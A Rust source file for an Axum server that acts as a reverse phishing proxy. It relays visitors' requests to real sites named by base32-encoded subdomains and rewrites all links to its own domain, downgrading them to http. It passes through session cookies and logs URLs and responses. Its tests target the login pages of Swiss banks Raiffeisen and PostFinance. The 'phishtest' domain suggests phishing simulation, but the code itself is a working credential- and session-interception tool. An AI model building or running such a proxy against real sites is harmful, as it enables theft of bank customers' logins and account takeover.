use axum::Router;
use axum::extract::{Path, Query, RawQuery};
use axum::http::{HeaderMap, Method, StatusCode};
use axum::response::IntoResponse;
use axum::routing::{delete, get, post, put};
use base32::decode;
use base64::Engine;
use base64::engine::general_purpose::STANDARD_NO_PAD;
use bytes::Bytes;
use cookie::CookieBuilder;
use lazy_static::lazy_static;
use regex::{Captures, Regex, Replacer};
use reqwest::cookie::Cookie;
use reqwest::redirect::Policy;
use reqwest::{Body, ClientBuilder, Url};
use std::collections::HashMap;
use std::fmt::format;
use std::string::ToString;

async fn get_root(
    path: Option<Path<String>>,
    method: Method,
    RawQuery(params): RawQuery,
    mut request_header: HeaderMap,
    body: Bytes,
) -> impl IntoResponse {
    let domain = "local-dev.phishtest.cloud:53001";

    // println!("Body: {}", body.len());

    let mut headers = HeaderMap::new();
    headers.insert(
        "Content-Security-Policy",
        format!("default-src 'self' http://*.{domain}/ data:; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline' 'unsafe-eval'")
            .parse()
            .unwrap(),
    );
    headers.insert("Referrer-Policy", "same-origin".parse().unwrap());

    let path = path.map(|i| i.0).unwrap_or_else(|| "".to_string());

    // println!("Start domain: {}", STANDARD_NO_PAD.encode("www.raiffeisen.ch"));

    let host: &str = request_header.get("Host").unwrap().to_str().unwrap();
    let subdomain = host.split(".").next().unwrap();
    // println!("Host: {}->{}", host, subdomain);

    let data =
        base32::decode(base32::Alphabet::Rfc4648Lower { padding: false }, subdomain).unwrap();
    let subdomain = String::from_utf8(data).unwrap();

    // println!("Host: {}->{}", host, subdomain);

    if path.contains("rfdwdc/") || path.contains("fcs2/") {
        return (StatusCode::NOT_FOUND, headers, Bytes::new());
    }
    if path.contains("unsupported-browser/") {
        return (StatusCode::NOT_FOUND, headers, Bytes::new());
    }

    request_header.remove("host");
    request_header.remove("origin");
    request_header.remove("referer");
    request_header.remove("accept-encoding");
    request_header.remove("content-length");
    // println!("Headers: {:?}", request_header);

    let mut url = Url::parse(&format!("https://{subdomain}/{path}")).unwrap();
    if let Some(query) = params {
        url.set_query(Some(query.as_str()));
    }

    println!("Url: {}", url);

    let client = ClientBuilder::new()
        .redirect(Policy::none())
        .build()
        .unwrap();
    let res = client
        .request(method, url)
        .headers(request_header)
        .body(Body::from(body)) //TODO inspect
        .send()
        .await
        .unwrap();

    for cookie in res.cookies() {
        let mut builder = CookieBuilder::new(cookie.name(), cookie.value());
        if let Some(path) = cookie.path() {
            builder = builder.path(path);
        }
        headers.append("Set-Cookie", builder.build().to_string().parse().unwrap());
    }

    println!("Response: {:?}", res);

    let status_code = res.status();
    // println!("Status: {}", status_code);
    // match (status_code) {
    //     StatusCode::MOVED_PERMANENTLY => {
    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
    //         let target = translate_domains(location.to_string(), domain, true);
    //         headers.insert("Location", target.parse().unwrap());
    //
    //         return (StatusCode::MOVED_PERMANENTLY, headers, Bytes::new());
    //     }
    //     StatusCode::TEMPORARY_REDIRECT => {
    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
    //         let target = translate_domains(location.to_string(), domain, true);
    //         headers.insert("Location", target.parse().unwrap());
    //
    //         return (StatusCode::TEMPORARY_REDIRECT, headers, Bytes::new());
    //     }
    //     _ => {}
    // }

    if let Some(location) = res.headers().get("location") {
        let target = translate_domains(location.to_str().unwrap().to_string(), domain, true);
        headers.insert("Location", target.parse().unwrap());
    }

    if let Some(content_type) = res.headers().get("Content-Type") {
        headers.insert("Content-Type", content_type.clone());
    }

    res.headers().iter().for_each(|(key, value)| {
        if !headers.contains_key(key) && key != "location" {
            // if let Ok(value) = value.to_str() {
            //     headers.insert(
            //         key.clone(),
            //         translate_domains(value.to_string(), domain, true)
            //             .parse()
            //             .unwrap(),
            //     );
            // } else {
            //     headers.insert(key.clone(), value.clone());
            // }
        }
    });

    let transfer_headers = vec!["post_flow_redirect"];
    for header in transfer_headers {
        if let Some(value) = res.headers().get(header) {
            headers.insert(header, value.clone());
        }
    }

    headers.remove("transfer-encoding");
    headers.remove("content-length");

    println!("Headers: {:?}", headers);

    let mut content = res.bytes().await.unwrap();

    if let Ok(string_content) = String::from_utf8(content.to_vec()) {
        content = Bytes::from(translate_domains(string_content, domain, true));
    }

    // builder.body(content).unwrap()
    // (headers, )
    (status_code, headers, content)
}

#[tokio::main]
async fn main() {
    // Convert the proxy to a router and use it in your Axum application
    let app: Router = Router::new()
        .route("/", get(get_root))
        .route("/{*path}", get(get_root))
        .route("/{*path}", delete(get_root))
        .route("/{*path}", post(get_root))
        .route("/{*path}", put(get_root));

    let listener = tokio::net::TcpListener::bind("0.0.0.0:53001")
        .await
        .unwrap();
    axum::serve(listener, app).await.unwrap();
}

struct NameSwapper<'a> {
    target_domain: &'a str,
    downgrade: bool,
}

impl<'a> Replacer for NameSwapper<'a> {
    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
        if let Some(scheme) = caps.get(1) {
            if !scheme.as_str().starts_with("http") {
                dst.push_str(&caps[0]);
                return;
            }

            if self.downgrade {
                dst.push_str("http:");
            } else {
                dst.push_str(&scheme.as_str());
            }
        }
        dst.push_str("//");
        dst.push_str(&encode_domain(&caps[2]));
        dst.push_str(".");
        dst.push_str(self.target_domain);
        if caps.get(3).is_some() {
            dst.push_str("/");
        }
    }
}

struct NameReverseSwapper {}

impl Replacer for NameReverseSwapper {
    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
        let domain = &caps[1];
        let domain = decode_domain(domain);
        dst.push_str(&domain);
    }
}

lazy_static!{
    static ref pattern: Regex = Regex::new(r"(?<scheme>https?:)?//((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9])(/)?").unwrap();
}

fn translate_domains(input: String, domain: &str, downgrade: bool) -> String {
    pattern
        .replace_all(
            input.as_str(),
            NameSwapper {
                target_domain: domain,
                downgrade,
            },
        )
        .to_string()
}

fn reverse_translate_domains(input: String, domain: &str) -> String {
    let p = Regex::new(&format!("(\\w+)\\.{}", domain)).unwrap();

    p.replace_all(input.as_str(), NameReverseSwapper {})
        .to_string()
}

fn encode_domain(domain: &str) -> String {
    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
    base32::encode(alphabet, domain.as_bytes())
}
fn decode_domain(domain: &str) -> String {
    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
    String::from_utf8(base32::decode(alphabet, domain).unwrap()).unwrap()
}

#[cfg(test)]
mod tests {
    use crate::{decode_domain, encode_domain, reverse_translate_domains, translate_domains};

    #[test]
    fn test_encoding() {
        let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };

        let input = encode_domain("www.raiffeisen.ch");
        assert_eq!("o53xoltsmfuwmztfnfzwk3romnua", input);

        let data = decode_domain(input.as_str());
        assert_eq!("www.raiffeisen.ch", data);

        let input = encode_domain("login.raiffeisen.ch");
        assert_eq!("nrxwo2lofzzgc2lgmzsws43fnyxgg2a", input);

        let input = encode_domain("www.postfinance.ch");
        assert_eq!("o53xoltqn5zxiztjnzqw4y3ffzrwq", input);
    }

    #[test]
    fn test_content_rewrite() {
        let input = "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>";

        let output = translate_domains(input.to_string(), "domain.local", false);
        assert_eq!(
            "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(input.to_string(), "domain.local", true);
        assert_eq!(
            "hreflang=\"it-CH\" href=\"http://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch/it\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"webpack://login.raiffeisen.ch/it\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"webpack://login.raiffeisen.ch/it\"/>",
            output
        );

        // let output = translate_domains(
        //     "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma".to_string(),
        //     "domain.local",
        //     true,
        // );
        // assert_eq!(
        //     "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma",
        //     output
        // );
    }

    #[test]
    fn test_content_reverse_rewrite() {
        let output = reverse_translate_domains(
            "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>"
                .to_string(),
            "domain.local",
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>",
            output
        );

        let output = reverse_translate_domains(
            "nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local".to_string(),
            "domain.local",
        );
        assert_eq!("login.raiffeisen.ch", output);
    }
}
